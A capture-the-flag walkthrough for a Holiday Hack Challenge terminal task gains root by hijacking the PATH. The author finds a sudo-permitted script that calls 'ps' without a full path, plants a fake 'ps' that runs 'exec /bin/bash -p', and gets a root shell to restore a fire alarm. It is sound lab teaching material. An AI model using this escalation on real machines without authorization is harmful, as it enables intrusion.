# TASK 2 - Neighborhood Watch Bypass #
Difficulty: ❄️

[Direct Link](https://hhc25-wetty-prod.holidayhackchallenge.com/?&challenge=termDosisAlarm)

## OBJECTIVE : ##
>Assist Kyle at the old data center with a fire alarm that just won't chill.

#  

## HINTS: ##
<details>
  <summary>Hints provided for Task 2</summary>
  
>-	**Phish Hijacking:** Be careful when writing scripts that allow regular users to run them. One thing to be wary of is not using full paths to executables...these can be hijacked.
>-	**What Are My Powers?:** You know, Sudo is a REALLY powerful tool. It allows you to run executables as ROOT!!! There is even a handy switch that will tell you what powers your user has.

</details>

#  

## PROCEDURE : ##
Right next to the entrance to the (Deprecated) Data Centre, we meet Kyle Parrish - a fireman who is having trouble with the building's fire alarm.  It keeps going off even though there is no actual fire and it appears as though someone has intentionally locked us out of the system.
Entering the terminal we are welcomed by the following banner:
```
🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨
              DOSIS NEIGHBORHOOD FIRE ALARM SYSTEM - LOCKOUT MODE
🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨

🚨 EMERGENCY ALERT: Fire alarm system admin access has been compromised! 🚨
The fire safety systems are experiencing interference and 
admin privileges have been mysteriously revoked. The neighborhood's fire 
protection infrastructure is at risk!

⚠️ CURRENT STATUS: Limited to standard user access only
🔒 FIRE SAFETY SYSTEMS: Partially operational but restricted
🎯 MISSION CRITICAL: Restore full fire alarm system control

Your mission: Find a way to bypass the current restrictions and elevate to 
fire safety admin privileges. Once you regain full access, run the special 
command `/etc/firealarm/restore_fire_alarm` to restore complete fire alarm system control and 
protect the Dosis neighborhood from potential emergencies.

🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨
```

So first of all, let' see what powers we have (as the hint suggests) by using `sudo -l` to see what we are allowed to run on the system with elevated privileges using sudo:

```
🏠 chiuser @ Dosis Neighborhood ~ 🔍 $ sudo -l
Matching Defaults entries for chiuser on 7c50429dd2e8:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty, secure_path=/home/chiuser/bin\:/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    env_keep+="API_ENDPOINT API_PORT RESOURCE_ID HHCUSERNAME", env_keep+=PATH

User chiuser may run the following commands on 7c50429dd2e8:
    (root) NOPASSWD: /usr/local/bin/system_status.sh
```

The output tells us that we are only allowed to run `/usr/local/bin/system_status.sh` as `root` by using `sudo`.  So let's have a look at what this script does:
```
🏠 chiuser @ Dosis Neighborhood ~ 🔍 $ cat /usr/local/bin/system_status.sh 
#!/bin/bash
echo "=== Dosis Neighborhood Fire Alarm System Status ==="
echo "Fire alarm system monitoring active..."
echo ""
echo "System resources (for alarm monitoring):" 
free -h
echo -e "\nDisk usage (alarm logs and recordings):"
df -h
echo -e "\nActive fire department connections:"
w
echo -e "\nFire alarm monitoring processes:"
ps aux | grep -E "(alarm|fire|monitor|safety)" | head -5 || echo "No active fire monitoring processes detected"
echo ""
echo "🔥 Fire Safety Status: All systems operational"
echo "🚨 Emergency Response: Ready"
echo "📍 Coverage Area: Dosis Neighborhood (all sectors)"
```

The script calls a number of programs such as `w`, `df`, `echo`, `ps`, etc.. **without using absolute paths**  (i.e. without defining that they should be run from the `/usr/local/bin/ directory`).  This is risky and in our case presents a way to access the script file we are tryign to reach.

By looking at the `$PATH` system variable we can confirm that the default path is set to `/home/chiuser/bin`, so whenever a command is called without an absolute path, the system will first attempt to look for it in that directory.  This means that we can create our own script that mimics one of the programs being called in `system_status.sh` and trick that script into executing our commands instead.

So let's try mimincing the `ps` program by creating an executable called `ps` under `/home/chiuser/bin`.

```
🏠 chiuser @ Dosis Neighborhood ~ 🔍 $ cd bin
🏠 chiuser @ Dosis Neighborhood ~/bin 🔍 $ nano ~/bin/ps
```

The file will consist of a bash script of a single line that simply launches a bash shell in priveleged mode:
```
#!/bin/bash
exec /bin/bash -p
```
Next we need to make the file executable:
```
🏠 chiuser @ Dosis Neighborhood ~/bin 🔍 $ chmod 755 ~/bin/ps
```
And by running `system_status.sh` with `sudo`, we can now seee that ut terminal prompt has changed and we now have root access and can therefore execute `/etc/firealarm/restore_fire_alarm` to disable the alarm's "Lockout Mode".

```
🏠 chiuser @ Dosis Neighborhood ~/bin 🔍 $ sudo /usr/local/bin/system_status.sh
=== Dosis Neighborhood Fire Alarm System Status ===
Fire alarm system monitoring active...
...
...
...
Active fire department connections:
 14:01:43 up 1 day, 16:04,  0 users,  load average: 0.05, 0.18, 0.14
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT

Fire alarm monitoring processes:
root@a2dfa698dbd6:/home/chiuser/bin# /etc/firealarm/restore_fire_alarm
root@a2dfa698dbd6:/home/chiuser/bin# exit
```

And that completes our task:
```
📡 Connecting to fire safety control center: https://2025.holidayhackchallenge.com:443/turnstile?rid=c66f61b1-9f0a-4eb3-aad7-10748559016a
🎯 SUCCESS! Fire alarm system admin access RESTORED!
✅ All fire safety systems are now under proper administrative control
🏠 Neighborhood fire protection: SECURED
   CONGRATULATIONS! You've successfully restored fire alarm system

🔥 Fire Safety Status: All systems operational
🚨 Emergency Response: Ready
📍 Coverage Area: Dosis Neighborhood (all sectors)
🏠 chiuser @ Dosis Neighborhood ~/bin 🔍 $ 
```
